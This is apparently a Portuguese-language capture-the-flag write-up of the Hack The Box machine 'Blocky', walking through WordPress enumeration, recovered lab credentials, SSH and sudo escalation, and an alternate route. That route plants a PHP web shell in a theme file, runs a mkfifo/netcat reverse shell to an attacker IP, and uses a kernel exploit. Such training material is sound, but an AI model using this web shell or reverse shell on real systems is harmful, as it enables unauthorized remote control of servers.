---
title: "Hack The Box - Blocky"
tags: [Linux,Easy,Wordpress,Web,Wfuzz,Kernel,Linux Exploit Suggester]
categories: HackTheBox OSWE OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/48>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 4 portas abertas no servidor

> Porta 21 -> Servidor FTP ProFTPD 1.3.5a

> Porta 22 -> Servidor SSH, dificilmente a exploração vai ser por aqui

> Portas 80 -> Servidor Web, bom ponto de entrada, uma vez que geralmente máquinas do HTB são exploradas por servidores Web

> Porta 8192 -> Nmap deu como fechada, algum firewall está bloqueando essas requisições

## Enumeração da porta 80

Verificamos que temos uma página web rodando na porta 80, possivelmente `Wordpress` pelo modo que está sendo mostrado o site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_web.png)

Testamos o `/wp-login`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_web2.png)

### Colocamos o `wfuzz` pra verificar por pastas no site

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_wfuzz.png)

#### Explicação `wfuzz`

> -c --> Exibir com cores

> -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --> Ataque dicionário e o respectivo arquivo

> --hc 404 --> Não vai mostrar os erros 404

### Já que conseguimos verificar que temos *Wordpress* vamos rodar o `wpscan`

Enumeramos usuários e a versão do Wordpress que está sendo rodada no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_wpscan0.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_wpscan1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_wpscan2.png)

## Entrando na pasta `plugins` que o wfuzz encontrou

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_pugins.png)

Baixamos eles pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_ls.png)

### Extraimos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_java.png)

# Exploração / Escalação de Privilégio

### Procuramos por senhas em um decompilador online de java, uma vez que o arquivo é .class

```
http://www.javadecompilers.com/
```
![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_java2.png)

Senha encontrada: 8YsqfCTnvxAUeduzjNSXe22

#### Tentamos SSH na máquina, uma vez que sabemos que há um usuário `notch`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_ssh.png)

Escalamos privilégio através do `sudo -l`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_ssh1.png)

### Lemos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_root.png)

```
A máquina aqui já está feita, contudo sempre é bom treinar outras práticas, vamos imaginar que não temos acesso ssh ao servidor assim fácil
```

_______

# Outro modo de fazer a máquina

## Uma vez que nem sempre teremos essa sorte de ter acesso ao servidor SSH de cara assim

### Enumeração da porta 21

Logamos com o usuário

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_ftp.png)

Criamos um par de chaves ssh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_ftp1.png)

Colocamos dentro do diretório .ssh no arquivo authorized_keys

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_fot2.png)

Logamos via ssh com a chave privada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_ftp3.png)

### Procuramos por credenciais no servidor Web (Por que? Pois possivelmente o serviço faz alguma ligação com banco de dados)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_ftp4.png)

#### Lembrando do `Wfuzz` ele encontrou um local chamado *phpmyadmin* no servidor, então vamos acessá-lo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php.png)

#### Logamos com as credenciais do wordpress encontradas no wp-config.php

> wordpress:kWuvW2SYsABmzywYRdoD

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php3.png)

###### Navegando dentro do banco de dados, vamos até o o db wordpress, wp_users e mudaremos a senha do notch para podermos acessar o wordpress

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php4.png)

###### Como já é sabido, essa senha está em formato de hash, nós não temos a senha, então vamos gerar um hash de uma senha que sabemos para colocar aqui

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php5.png)

###### Alteramos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php7.png)

#### Agora vamos logar no wordpress com essa senha gerada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php8.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php9.png)

#### Vamos em `Appearance` `Editor` `Theme Header - Header.php`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php10.png)

#### Adicionamos um Web Shell dentro do código, pra podermos ter RCE na máquina

```
<?php
echo "<form action='' method='post'>
   <input type='text' name='c' value='' size='60'/>
   <input type='submit' />
   </form>";
if (isset($_POST['c'])){
   if(function_exists('shell_exec')) {
   $c=$_POST['c'];
      echo "<pre>".shell_exec("$c")."</pre>";
   }
}
?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php11.png)

#### Verificamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php12.png)

#### Ganhamos um shell na máquina

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.119 443 >/tmp/f

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php13.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_php14.png)

#### Rodamos o script Linux-Exploit-Suggester para escalação de privilégio através de exploits de kernel

> https://github.com/mzet-/linux-exploit-suggester

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_les.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_www.png)

##### Vamos explorar essa vulnerabilidade do Kernel `CVE-2017-6074`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_www1.png)

###### Pesquisamos e encontramos um exploit para ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_exp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_exp1.png)

##### Copiamos para nossa máquina e verificamos como compilar ele, compilamos e enviamos para a máquina Blocky

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_exp2.png)

##### Tornamos executável e ganhamos shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-blocky/Blocky_exp3.png)